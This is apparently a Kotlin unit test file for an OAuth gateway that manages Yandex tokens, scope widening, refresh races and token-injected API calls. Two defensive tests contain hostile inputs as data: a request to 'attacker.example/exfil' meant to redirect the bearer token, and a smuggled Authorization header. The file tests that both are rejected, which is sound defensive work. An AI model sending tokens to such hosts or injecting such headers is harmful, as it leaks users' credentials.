package ru.souz.skilloauth.impl

import io.ktor.client.HttpClient
import io.ktor.client.engine.mock.MockEngine
import io.ktor.client.engine.mock.respond
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.http.headersOf
import java.time.Clock
import java.time.Instant
import java.time.ZoneOffset
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue
import kotlin.test.assertFailsWith
import kotlinx.coroutines.test.runTest
import ru.souz.skilloauth.ApiCallReconnectRequired
import ru.souz.skilloauth.ApiCallRequest
import ru.souz.skilloauth.ApiCallResponse
import ru.souz.skilloauth.AuthorizationState
import ru.souz.skilloauth.SkillOAuthException

/**
 * Covers the parts of [SkillOAuthGatewayImpl] that do not require a live network call
 * (ensureAuthorized uses no HTTP; `buildAuthorizeUrl` is a pure string builder).
 * Token-exchange/refresh paths (which call the real Yandex endpoints) are not covered
 * here — see the plan's noted gap around HTTP-mocked provider tests.
 */
class SkillOAuthGatewayImplTest {
    private val fixedClock = Clock.fixed(Instant.parse("2026-01-01T00:00:00Z"), ZoneOffset.UTC)
    private val testCryptoKey = java.util.Base64.getEncoder().encodeToString(ByteArray(32))
    private val testCrypto = SkillOAuthTokenCrypto(testCryptoKey)

    private fun newApi(
        credentialRepository: SkillOAuthCredentialRepository = InMemorySkillOAuthCredentialRepository(),
        pendingStateRepository: SkillOAuthPendingStateRepository = InMemorySkillOAuthPendingStateRepository(),
        httpClient: HttpClient = defaultSkillOAuthHttpClient(),
        providers: Map<String, OAuthProviderClient> = mapOf(
            "yandex" to AuthorizationCodeOAuthClient(
                config = AuthorizationCodeOAuthConfig(
                    name = "yandex",
                    authorizeEndpoint = "https://oauth.yandex.ru/authorize",
                    tokenEndpoint = "https://oauth.yandex.ru/token",
                    clientId = "client-1",
                    clientSecret = "secret-1",
                    redirectUri = "https://backend.example/oauth/callback",
                    allowedApiHosts = setOf("login.yandex.ru"),
                    extraAuthorizeParams = emptyMap(),
                    authorizationScheme = "Bearer",
                ),
            )
        ),
    ) = SkillOAuthGatewayImpl(
        credentialRepository = credentialRepository,
        pendingStateRepository = pendingStateRepository,
        crypto = SkillOAuthTokenCrypto(testCryptoKey),
        providers = providers,
        httpClient = httpClient,
        clock = fixedClock,
    )

    /** Lets [handleCallback]-driving tests control exactly what a code exchange/refresh returns,
     *  without a real HTTP call. */
    private class FakeOAuthProviderClient(
        override val name: String = "yandex",
        override val allowedApiHosts: Set<String> = setOf("login.yandex.ru"),
        override val authorizationScheme: String = "Bearer",
        private val exchangeResults: Map<String, OAuthTokenResult> = emptyMap(),
        private val refreshException: Throwable? = null,
    ) : OAuthProviderClient {
        override fun buildAuthorizeUrl(state: String, scopes: List<String>): String =
            "https://fake.example/authorize?state=$state&scope=${scopes.joinToString(" ")}"

        override suspend fun exchangeCode(code: String): OAuthTokenResult =
            exchangeResults[code] ?: throw SkillOAuthException("No fake exchange result for code '$code'.")

        override suspend fun refresh(refreshToken: String): OAuthTokenResult =
            throw refreshException ?: UnsupportedOperationException("Not used in this test.")
    }

    private suspend fun connectedCredentialRepository(
        grantedScopes: List<String> = listOf("login:info"),
    ): SkillOAuthCredentialRepository {
        val repository = InMemorySkillOAuthCredentialRepository()
        repository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("real-access-token"),
                refreshTokenEncrypted = null,
                grantedScopes = grantedScopes,
                expiresAt = null,
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        return repository
    }

    @Test
    fun `ensureAuthorized requires authorization when no credential is stored`() = runTest {
        val api = newApi()

        val state = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = emptySet())

        assertTrue(state is AuthorizationState.AuthorizationRequired)
    }

    @Test
    fun `ensureAuthorized reports connected once a credential covers the required scopes`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        val state = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))

        assertEquals(AuthorizationState.Connected, state)
    }

    @Test
    fun `ensureAuthorized requires authorization widened to the union when granted scopes do not cover requiredScopes`() = runTest {
        // Regression test for a shared (userId, provider) credential accumulating scopes for one
        // skill that another, more narrowly-declared skill must not silently ride on.
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        val state = api.ensureAuthorized(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info", "iot:control"),
        )

        assertTrue(state is AuthorizationState.AuthorizationRequired)
        val scopeParam = state.url.substringAfter("scope=").substringBefore("&")
        assertEquals(
            setOf("login:info", "iot:control"),
            java.net.URLDecoder.decode(scopeParam, "UTF-8").split(" ").toSet(),
        )
    }

    @Test
    fun `ensureAuthorized reports connected when requiredScopes are a subset of grantedScopes`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info", "iot:control", "iot:view")))

        val state = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("iot:view"))

        assertEquals(AuthorizationState.Connected, state)
    }

    @Test
    fun `ensureAuthorized returns an authorize URL when not yet connected`() = runTest {
        val api = newApi()

        val state = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))

        assertTrue(state is AuthorizationState.AuthorizationRequired)
        assertTrue(state.url.startsWith("https://oauth.yandex.ru/authorize?"))
        assertTrue(state.url.contains("client_id=client-1"))
        assertTrue(state.url.contains("scope=login%3Ainfo"))
    }

    @Test
    fun `ensureAuthorized reuses a still-live pending link instead of minting a new one`() = runTest {
        // D00mch: ensureAuthorized is documented as idempotent, so a retry or an overlapping call
        // asking for scopes an already-issued, unconsumed link already covers must not invalidate
        // that link — the user could already have it open in a browser tab.
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val first = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))
        val second = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))

        check(first is AuthorizationState.AuthorizationRequired)
        check(second is AuthorizationState.AuthorizationRequired)
        assertEquals(first.url, second.url)
        val firstState = first.url.substringAfter("state=").substringBefore("&")
        // Still consumable — reuse must not have superseded (or otherwise touched) the live state.
        assertTrue(pendingStateRepository.consume(firstState, fixedClock.instant()) != null)
    }

    @Test
    fun `ensureAuthorized reuse does not require an exact scope match, only coverage`() = runTest {
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val first = api.ensureAuthorized(
            userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info", "iot:control"),
        )
        val second = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))

        check(first is AuthorizationState.AuthorizationRequired)
        check(second is AuthorizationState.AuthorizationRequired)
        assertEquals(first.url, second.url)
    }

    @Test
    fun `ensureAuthorized force always mints a fresh link even when a covering one is still live`() = runTest {
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val first = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))
        val second = api.ensureAuthorized(
            userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"), force = true,
        )

        check(first is AuthorizationState.AuthorizationRequired)
        check(second is AuthorizationState.AuthorizationRequired)
        assertTrue(first.url != second.url)
        val firstState = first.url.substringAfter("state=").substringBefore("&")
        assertTrue(pendingStateRepository.consume(firstState, fixedClock.instant()) == null)
    }

    @Test
    fun `ensureAuthorized supersedes an existing pending state for the same user and provider`() = runTest {
        // Regression test: without superseding, two overlapping ConnectOAuthProvider calls for the
        // same (userId, provider) would leave two live `state` tokens. The scope-union itself is
        // covered by beginAuthorization's own dedicated tests (Postgres repository test file); this
        // test just checks the old link is invalidated.
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val first = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))
        val second = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("iot:control"))

        check(first is AuthorizationState.AuthorizationRequired)
        check(second is AuthorizationState.AuthorizationRequired)
        val firstState = first.url.substringAfter("state=").substringBefore("&")
        assertTrue(pendingStateRepository.consume(firstState, fixedClock.instant()) == null)
        val secondScopeParam = second.url.substringAfter("scope=").substringBefore("&")
        assertEquals("login:info iot:control", java.net.URLDecoder.decode(secondScopeParam, "UTF-8"))
    }

    @Test
    fun `ensureAuthorized widens its request even after an earlier flow's pending state was already consumed`() = runTest {
        // The maintainer's own finding: superseding only helps while a prior flow is still
        // *pending*. Once a callback consumes its own pending state (the first thing
        // handleCallback does), a second, unrelated ensureAuthorized call for the same
        // (userId, provider) has nothing left to supersede *in pending_states* — but the durable
        // requested-scope tracking survives past that, so this call still sees and widens on top
        // of the first one's request instead of only asking for its own scope.
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        val api = newApi(pendingStateRepository = pendingStateRepository)

        val authA = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("login:info"))
        check(authA is AuthorizationState.AuthorizationRequired)
        val stateA = authA.url.substringAfter("state=").substringBefore("&")
        // Simulates "callback A already consumed its own pending state, mid-exchange".
        pendingStateRepository.consume(stateA, fixedClock.instant())

        val authB = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = setOf("iot:control"))
        check(authB is AuthorizationState.AuthorizationRequired)

        val scopeParam = authB.url.substringAfter("scope=").substringBefore("&")
        assertEquals(
            setOf("login:info", "iot:control"),
            java.net.URLDecoder.decode(scopeParam, "UTF-8").split(" ").toSet(),
        )
    }

    @Test
    fun `a stale callback cannot overwrite a fresher credential for the same user and provider`() = runTest {
        // Complements the widening test above: even if a stale callback's network exchange finishes
        // after a fresher, independent authorization has already saved its own credential, the stale
        // one's older generation must not clobber it.
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("fresh-token"),
                refreshTokenEncrypted = null,
                grantedScopes = listOf("login:info", "iot:control"),
                expiresAt = null,
                generation = 5,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val provider = FakeOAuthProviderClient(
            exchangeResults = mapOf(
                "stale-code" to OAuthTokenResult("stale-token", null, null, listOf("login:info")),
            ),
        )
        val pendingStateRepository = InMemorySkillOAuthPendingStateRepository()
        pendingStateRepository.beginAuthorization(
            state = "stale-state",
            userId = "user-1",
            skillId = "skill-1",
            provider = "yandex",
            scopes = listOf("login:info"),
            now = fixedClock.instant(),
            activeSince = fixedClock.instant().minusSeconds(600),
            expiresAt = fixedClock.instant().plusSeconds(600),
        )
        // Generation from beginAuthorization above is 1 — older than the already-saved
        // credential's generation=5, which is exactly the scenario under test.
        val api = newApi(
            credentialRepository = credentialRepository,
            pendingStateRepository = pendingStateRepository,
            providers = mapOf("yandex" to provider),
        )

        api.handleCallback(code = "stale-code", state = "stale-state")

        val stored = credentialRepository.find("user-1", "yandex")
        assertEquals("fresh-token", testCrypto.decrypt(stored!!.accessTokenEncrypted))
        assertEquals(setOf("login:info", "iot:control"), stored.grantedScopes.toSet())
    }

    @Test
    fun `ensureAuthorized requires authorization when the access token has expired and there is no refresh token`() = runTest {
        // Regression test: a credential row existing must not be conflated with it being usable —
        // otherwise ensureAuthorized would forever report Connected instead of ever issuing a fresh
        // authorize URL once the token is truly unrecoverable.
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("stale-token"),
                refreshTokenEncrypted = null,
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().minusSeconds(60),
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val api = newApi(credentialRepository = credentialRepository)

        val state = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = emptySet())

        assertTrue(state is AuthorizationState.AuthorizationRequired)
    }

    @Test
    fun `ensureAuthorized reports connected when the access token has expired but a refresh token is available`() = runTest {
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("stale-token"),
                refreshTokenEncrypted = testCrypto.encrypt("refresh-token"),
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().minusSeconds(60),
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val api = newApi(credentialRepository = credentialRepository)

        val state = api.ensureAuthorized(userId = "user-1", provider = "yandex", requiredScopes = emptySet())

        assertEquals(AuthorizationState.Connected, state)
    }

    @Test
    fun `call returns reconnectRequired for an expired credential with no refresh token`() = runTest {
        // Needing to reconnect is a routine outcome, not a caller error — modeled as a normal
        // ApiCallOutcome (with a ready-to-relay authorizationUrl), not a thrown exception.
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("stale-token"),
                refreshTokenEncrypted = null,
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().minusSeconds(60),
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val api = newApi(credentialRepository = credentialRepository)

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertTrue(outcome is ApiCallReconnectRequired)
        assertTrue(outcome.authorizationUrl.startsWith("https://oauth.yandex.ru/authorize?"))
    }

    @Test
    fun `call still uses a not-yet-expired token with no refresh token, inside the refresh safety margin`() = runTest {
        // Regression test for a "dead zone": without a refresh token, the safety margin used to
        // make ensureFreshAccessToken throw up to EXPIRY_SAFETY_MARGIN_SECONDS before the token was
        // actually expired, while ensureAuthorized/isCredentialUsable (no margin) still reported
        // connected — a contradiction. The margin only makes sense when a refresh is actually
        // possible.
        val mockEngine = MockEngine { respond(content = "{}", status = HttpStatusCode.OK) }
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("still-valid-token"),
                refreshTokenEncrypted = null,
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().plusSeconds(30), // inside the 60s margin, not yet expired
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val api = newApi(credentialRepository = credentialRepository, httpClient = HttpClient(mockEngine))

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertEquals(200, (outcome as ApiCallResponse).statusCode)
    }

    @Test
    fun `a confirmed invalid refresh token is cleared so ensureAuthorized stops reporting connected`() = runTest {
        // D00mch: a stored refresh token is not necessarily a *usable* one (corrupted/revoked). On
        // a confirmed OAuth error from the provider (not a transient network failure — see
        // ensureFreshAccessToken's catch), the refresh token must be cleared so a future
        // ensureAuthorized check reports AuthorizationRequired instead of retrying the same broken
        // token forever.
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("expired-token"),
                refreshTokenEncrypted = testCrypto.encrypt("revoked-refresh-token"),
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().minusSeconds(60),
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val provider = FakeOAuthProviderClient(
            refreshException = OAuthProviderErrorException(errorCode = "invalid_grant", message = "Token is revoked."),
        )
        val api = newApi(credentialRepository = credentialRepository, providers = mapOf("yandex" to provider))

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertTrue(outcome is ApiCallReconnectRequired)
        assertTrue(
            api.ensureAuthorized("user-1", "yandex", emptySet()) is AuthorizationState.AuthorizationRequired
        )
    }

    @Test
    fun `losing a concurrent refresh race reuses the winner's credential instead of reporting reconnectRequired`() = runTest {
        // Two overlapping refreshes of the same expired credential against a provider that rotates
        // refresh tokens: the winner commits first (bumping revision), so the loser's own provider
        // round-trip comes back invalid_grant (its refresh token was just invalidated by the
        // rotation) and its own upsert(refreshTokenEncrypted = null) loses the CAS. That must not
        // discard the winner's still-valid credential and force a needless reconnect.
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("expired-token"),
                refreshTokenEncrypted = testCrypto.encrypt("stale-refresh-token"),
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().minusSeconds(60),
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        var capturedAuthorization: String? = null
        val provider = object : OAuthProviderClient {
            override val name = "yandex"
            override val allowedApiHosts = setOf("login.yandex.ru")
            override val authorizationScheme = "Bearer"

            override fun buildAuthorizeUrl(state: String, scopes: List<String>) =
                "https://fake.example/authorize?state=$state"

            override suspend fun exchangeCode(code: String) =
                throw SkillOAuthException("Not used in this test.")

            override suspend fun refresh(refreshToken: String): OAuthTokenResult {
                // Simulates the winner's own refresh landing (and rotating the refresh token)
                // while this loser's network round-trip to the provider is still in flight.
                val stale = credentialRepository.find("user-1", "yandex")!!
                credentialRepository.upsert(
                    stale.copy(
                        accessTokenEncrypted = testCrypto.encrypt("winner-access-token"),
                        refreshTokenEncrypted = testCrypto.encrypt("winner-refresh-token"),
                        expiresAt = fixedClock.instant().plusSeconds(3600),
                        updatedAt = fixedClock.instant(),
                    )
                )
                throw OAuthProviderErrorException(errorCode = "invalid_grant", message = "rotated refresh token")
            }
        }
        val httpClientWithCapture = HttpClient(MockEngine { request ->
            capturedAuthorization = request.headers[HttpHeaders.Authorization]
            respond(content = "{}", status = HttpStatusCode.OK)
        })
        val api = newApi(
            credentialRepository = credentialRepository,
            providers = mapOf("yandex" to provider),
            httpClient = httpClientWithCapture,
        )

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertEquals(200, (outcome as ApiCallResponse).statusCode)
        assertEquals("Bearer winner-access-token", capturedAuthorization)
        assertEquals(
            "winner-refresh-token",
            testCrypto.decrypt(credentialRepository.find("user-1", "yandex")!!.refreshTokenEncrypted!!),
        )
    }

    @Test
    fun `a non-invalid_grant refresh error does not clear the refresh token and does not report reconnectRequired`() = runTest {
        // D00mch: toTokenResult() throws the same exception type for every OAuth error code —
        // invalid_client, invalid_scope, server_error, etc. are not evidence the refresh token
        // itself is dead, and clearing it over one of those forces a needless full reconnect that
        // wouldn't have been necessary once the transient issue (or our own config) is fixed.
        // Reporting ApiCallReconnectRequired would be equally wrong here — a fresh authorize link
        // doesn't fix a provider outage or our own client misconfiguration — so this must instead
        // propagate as a plain SkillOAuthException, distinct from ReconnectRequiredException.
        val credentialRepository = InMemorySkillOAuthCredentialRepository()
        credentialRepository.upsert(
            SkillOAuthCredential(
                userId = "user-1",
                provider = "yandex",
                accessTokenEncrypted = testCrypto.encrypt("expired-token"),
                refreshTokenEncrypted = testCrypto.encrypt("still-good-refresh-token"),
                grantedScopes = listOf("login:info"),
                expiresAt = fixedClock.instant().minusSeconds(60),
                generation = 1,
                createdAt = Instant.now(),
                updatedAt = Instant.now(),
            )
        )
        val provider = FakeOAuthProviderClient(
            refreshException = OAuthProviderErrorException(errorCode = "server_error", message = "temporary provider outage"),
        )
        val api = newApi(credentialRepository = credentialRepository, providers = mapOf("yandex" to provider))

        val thrown = assertFailsWith<SkillOAuthException> {
            api.call(
                userId = "user-1",
                provider = "yandex",
                requiredScopes = setOf("login:info"),
                request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
            )
        }

        assertFalse(thrown is ReconnectRequiredException)
        assertEquals(
            "still-good-refresh-token",
            testCrypto.decrypt(credentialRepository.find("user-1", "yandex")!!.refreshTokenEncrypted!!),
        )
    }

    @Test
    fun `reconnect preserves scopes already granted for a different caller, not just the failing call's own requiredScopes`() = runTest {
        // D00mch: startAuthorization was called with only the failing call's requiredScopes,
        // ignoring what the shared credential already grants. Once the durable requested-scope
        // tracking's staleness window passes, that widening can't recover the old grant either —
        // so an unrelated caller's perfectly fine access silently disappears the moment this
        // callback saves a scope-narrower token.
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("other-caller:scope")))

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("this-caller:scope"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertTrue(outcome is ApiCallReconnectRequired)
        val scopeParam = outcome.authorizationUrl
            .substringAfter("scope=").substringBefore("&")
        assertEquals(
            setOf("other-caller:scope", "this-caller:scope"),
            java.net.URLDecoder.decode(scopeParam, "UTF-8").split(" ").toSet(),
        )
    }

    @Test
    fun `call returns reconnectRequired when not connected yet`() = runTest {
        val api = newApi()

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = emptySet(),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertTrue(outcome is ApiCallReconnectRequired)
    }

    @Test
    fun `two overlapping calls needing reconnect for the same provider get the same authorize link`() = runTest {
        // D00mch: without reuse, two API calls racing to reconnect for the same (userId, provider)
        // would each mint (and invalidate) their own link — a link already relayed to the user from
        // the first call would silently stop working the moment the second call's link is issued.
        val api = newApi()

        val first = api.call(
            userId = "user-1", provider = "yandex", requiredScopes = emptySet(),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )
        val second = api.call(
            userId = "user-1", provider = "yandex", requiredScopes = emptySet(),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        check(first is ApiCallReconnectRequired)
        check(second is ApiCallReconnectRequired)
        assertEquals(first.authorizationUrl, second.authorizationUrl)
    }

    @Test
    fun `call returns reconnectRequired when requiredScopes exceed grantedScopes`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info", "iot:control"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertTrue(outcome is ApiCallReconnectRequired)
        // widened to include what's already granted, not just the missing scope.
        assertTrue(outcome.authorizationUrl.contains("iot%3Acontrol"))
    }

    @Test
    fun `call rejects a URL host outside the provider's allowlist`() = runTest {
        // Regression test: without this check, a hijacked model turn could redirect the real
        // bearer token to an attacker-controlled or internal host via the model-supplied `url`.
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        assertFailsWith<SkillOAuthException> {
            api.call(
                userId = "user-1",
                provider = "yandex",
                requiredScopes = setOf("login:info"),
                request = ApiCallRequest(method = "GET", url = "https://attacker.example/exfil"),
            )
        }
    }

    @Test
    fun `call rejects a non-HTTPS URL even on an allowed host`() = runTest {
        val api = newApi(credentialRepository = connectedCredentialRepository(listOf("login:info")))

        assertFailsWith<SkillOAuthException> {
            api.call(
                userId = "user-1",
                provider = "yandex",
                requiredScopes = setOf("login:info"),
                request = ApiCallRequest(method = "GET", url = "http://login.yandex.ru/info"),
            )
        }
    }

    @Test
    fun `call forwards caller headers and response headers`() = runTest {
        var capturedHeaders: io.ktor.http.Headers? = null
        val mockEngine = MockEngine { request ->
            capturedHeaders = request.headers
            respond(
                content = "{}",
                status = HttpStatusCode.OK,
                headers = headersOf("X-Provider-Header", listOf("provider-value")),
            )
        }
        val api = newApi(
            credentialRepository = connectedCredentialRepository(listOf("login:info")),
            httpClient = HttpClient(mockEngine),
        )

        val outcome = api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(
                method = "GET",
                url = "https://login.yandex.ru/info",
                headers = mapOf("X-Custom" to "custom-value"),
            ),
        )

        assertEquals("custom-value", capturedHeaders?.get("X-Custom"))
        assertEquals("provider-value", (outcome as ApiCallResponse).headers["X-Provider-Header"])
    }

    @Test
    fun `call does not override a caller-supplied Content-Type`() = runTest {
        // Regression test: defaulting to JSON unconditionally would silently override (or
        // duplicate) a provider-required Content-Type like form-urlencoded or XML.
        var capturedContentType: String? = null
        val mockEngine = MockEngine { request ->
            capturedContentType = request.body.contentType?.toString()
            respond(content = "{}", status = HttpStatusCode.OK)
        }
        val api = newApi(
            credentialRepository = connectedCredentialRepository(listOf("login:info")),
            httpClient = HttpClient(mockEngine),
        )

        api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(
                method = "POST",
                url = "https://login.yandex.ru/info",
                body = "field=value",
                headers = mapOf("Content-Type" to "application/x-www-form-urlencoded"),
            ),
        )

        assertEquals("application/x-www-form-urlencoded", capturedContentType)
    }

    @Test
    fun `call never lets a caller-supplied Authorization header override the real access token`() = runTest {
        // Regression test: `headers` on ApiCallRequest is a model-supplied field; without this
        // protection a hijacked model turn could smuggle its own `Authorization` value and either
        // clobber the real bearer token in transit or (depending on server behavior) have both
        // sent, defeating the whole point of injecting the token server-side.
        var capturedAuthorization: String? = null
        val mockEngine = MockEngine { request ->
            capturedAuthorization = request.headers[HttpHeaders.Authorization]
            respond(content = "{}", status = HttpStatusCode.OK)
        }
        val api = newApi(
            credentialRepository = connectedCredentialRepository(listOf("login:info")),
            httpClient = HttpClient(mockEngine),
        )

        api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(
                method = "GET",
                url = "https://login.yandex.ru/info",
                headers = mapOf("Authorization" to "Bearer attacker-supplied-token"),
            ),
        )

        assertEquals("Bearer real-access-token", capturedAuthorization)
    }

    @Test
    fun `call sends the provider's own authorization scheme instead of hardcoding Bearer`() = runTest {
        // Regression test: Yandex's APIs expect `Authorization: OAuth <token>` and reject a
        // `Bearer`-prefixed token with 401 even when the token itself is valid.
        var capturedAuthorization: String? = null
        val mockEngine = MockEngine { request ->
            capturedAuthorization = request.headers[HttpHeaders.Authorization]
            respond(content = "{}", status = HttpStatusCode.OK)
        }
        val provider = AuthorizationCodeOAuthClient(
            config = AuthorizationCodeOAuthConfig(
                name = "yandex",
                authorizeEndpoint = "https://oauth.yandex.ru/authorize",
                tokenEndpoint = "https://oauth.yandex.ru/token",
                clientId = "client-1",
                clientSecret = "secret-1",
                redirectUri = "https://backend.example/oauth/callback",
                allowedApiHosts = setOf("login.yandex.ru"),
                extraAuthorizeParams = emptyMap(),
                authorizationScheme = "OAuth",
            ),
        )
        val api = newApi(
            credentialRepository = connectedCredentialRepository(listOf("login:info")),
            httpClient = HttpClient(mockEngine),
            providers = mapOf("yandex" to provider),
        )

        api.call(
            userId = "user-1",
            provider = "yandex",
            requiredScopes = setOf("login:info"),
            request = ApiCallRequest(method = "GET", url = "https://login.yandex.ru/info"),
        )

        assertEquals("OAuth real-access-token", capturedAuthorization)
    }

    @Test
    fun `unsupported providers are rejected across all entry points`() = runTest {
        val api = newApi()

        assertFailsWith<SkillOAuthException> { api.ensureAuthorized("user-1", "github", emptySet()) }
        assertFailsWith<SkillOAuthException> {
            api.call("user-1", "github", emptySet(), ApiCallRequest("GET", "https://example.com"))
        }
    }
}
